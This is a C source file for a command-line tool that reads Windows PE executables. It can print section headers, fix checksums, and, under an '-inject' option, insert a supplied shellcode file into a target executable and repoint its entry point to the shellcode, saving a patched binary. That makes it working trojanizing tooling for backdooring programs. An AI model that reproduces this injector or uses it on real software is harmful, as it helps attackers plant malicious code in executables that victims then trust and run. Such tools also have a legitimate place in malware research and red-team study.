#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "../lib/custom_io.h"
#include "../lib/inject.h"
#include "../lib/map.h"
#include "../lib/PE.h"
#include "../lib/DOS.h"
#include "../lib/custom_io_pe.h"

char *target;
char *shellcode;
char *output;

int main(int argc , char **argv){
	basic_map *args = mapCreate_fromParams(argc, argv);
	if(!args)
		return 1;

	if(_mapKeyExist(args, "-showSections")){
		PE_STRUCTURE *pe = loadPE(mapKeyLookup(args, "-target"));
		printf("Number of Sections:\t%u\n",pe->image_nt_header->image_file_header.numberOfSections);
		uint32_t sizeOfheaders = pe->image_nt_header->image_optional_header.sizeOfHeaders;
		printf("Header Size:\t\t%u\n",sizeOfheaders);
		IMAGE_SECTION_HEADER *section = pe->image_section_header;
		for(size_t i = 0 ; i < pe->image_nt_header->image_file_header.numberOfSections ;i++ ){
			printf("[Section %lu - %s]\n",i+1,section->name);
			printf("\tCharacteristics\t\t0x%X\n",section->characteristics);
			printf("\tSize\t\t\t0x%X\n",section->sizeOfRawData);
			printf("\tVirtual Address\t\t0x%X\n",section->virtualAddress);
			printf("\tPhysical Address\t0x%X\n",section->Misc.physicalAddress);


			section = (struct _IMAGE_SECTION_HEADER *)(section->name + sizeof(struct _IMAGE_SECTION_HEADER));
		}

		free(pe->buffer);
		free(pe);
	}

	if(_mapKeyExist(args, "-showNT")){

	}

	if(_mapKeyExist(args, "-recheck")){
	PE_STRUCTURE *pe = loadPE(mapKeyLookup(args, "-target"));
	long chksum = pe_checksum(pe);
	printf("Target Checksum:\t0x%X\n",pe->image_nt_header->image_optional_header.checkSum);
	printf("Calculated Checksum:\t0x%lX\n",chksum);
	pe->image_nt_header->image_optional_header.checkSum = chksum;
	bufferToFile(pe->buffer, pe->size, mapKeyLookup(args, "-target"));
	free(pe->buffer);
	free(pe);
	mapDestroy(args);
	return 0;
	}

	if(_mapKeyExist(args, "-inject")){ //TODO: Proper cleanup.
		target = mapKeyLookup(args, "-target");
		shellcode = mapKeyLookup(args, "-shellcode");
		output = mapKeyLookup(args, "-output");

		printf("Target: %s\nShellcode: %s\nOutput: %s\n",target,shellcode,output);
		PE_STRUCTURE *pe = loadPE(mapKeyLookup(args, "-target"));
		struct _IMAGE_SECTION_HEADER **sections = pe_sections(pe);
		if(!sections)
			return 1;

		compound_file *cf_shellcode = fileToBuffer(mapKeyLookup(args, "-shellcode"));
		inject_data id;
		injectData(pe, sections, cf_shellcode,&id);
		printf("Shellcode is at %lx\n",id.position_in_memory);
		// uint32_t oldEntry = pe->image_nt_header->image_optional_header.addressOfEntryPoint;
		pe->image_nt_header->image_optional_header.addressOfEntryPoint = id.position_in_memory - pe->image_nt_header->image_optional_header.baseOfCode;
		printf("Patched the entrypoint to be %x\n",pe->image_nt_header->image_optional_header.addressOfEntryPoint);

		bufferToFile(pe->buffer, pe->size, mapKeyLookup(args, "-output"));
		destroyCompoundFile(cf_shellcode);
		free(pe->buffer);
		free(pe);

		return 0;
	}

	mapDestroy(args);
	return 0;
}
